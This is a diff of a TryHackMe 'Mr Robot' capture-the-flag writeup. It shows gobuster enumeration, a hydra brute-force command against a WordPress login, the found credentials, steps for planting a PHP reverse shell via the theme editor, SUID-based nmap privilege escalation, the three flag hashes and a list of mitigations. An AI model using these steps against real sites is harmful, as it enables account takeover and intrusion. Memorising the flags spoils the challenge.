@@ -1,5 +1,10 @@
+# Mr Robot – TryHackMe Writeup
 
-
+> Platform: TryHackMe  
+> Room: Mr Robot  
+> Difficulty: Medium  
+> Focus: Web Exploitation | SSH Access | Privilege Escalation  
+> Inspired by the TV series Mr. Robot  
 
 
 ## Nmap Scans 
@@ -20,15 +25,38 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 20.15 seconds
 ```
-## Vulnerability
-```bash
-A wordpress login page was found after gobuster scan , found the credentials through hydra and fsocity.dic file found in robots.txt.
+## Web Enumeration
+```
+gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirb/common.txt
+Important Findings
+/robots.txt
+/wp-login.php
+/wp-admin
+```
+## Wordpress Bruteforce
+```
+hydra -L users.txt -P fsocity.dic <TARGET-IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"
+```
+Credentials found
+```
 Username: Elliot
 Password: ER28-0652 (Elliot's employee number)
+```
+## Reverse Shell via WordPress Editor
+```
+Steps :
+Navigated to Appearance → Theme Editor
+Modified a PHP template file
+Inserted pentestmonkey PHP reverse shell
+Set up Netcat listener
+```
 
-after the login found an editor option which can be exploited for revers shell.
-a netcat lister was setup on the attack machine with port 53 to avoid firewall blockage
-from pentestmonkey got the php-reverse shell.
+## Privilage escalation
+```
+sudo -l
+find / -perm -4000 2>/dev/null
+
+nmap was having root privilages - exploited it using "nmap -interaction"
 ```
 
 ## Keys
@@ -36,4 +64,15 @@ from pentestmonkey got the php-reverse shell.
 1.073403c8a58a1f80d943455fb30724b9
 2. 822c73956184f694993bede3eb39f959
 3.04787ddef27c3dee1ee161b21670b4e4
+```
+
+## This attcak could be mitigated by:
+```
+Disabling WordPress file editor
+Strong password enforcement
+Login rate limiting
+Disabling XML-RPC
+Monitoring repeated failed logins
+Restricting wp-admin access
+Auditing SUID binaries regularly
 ```
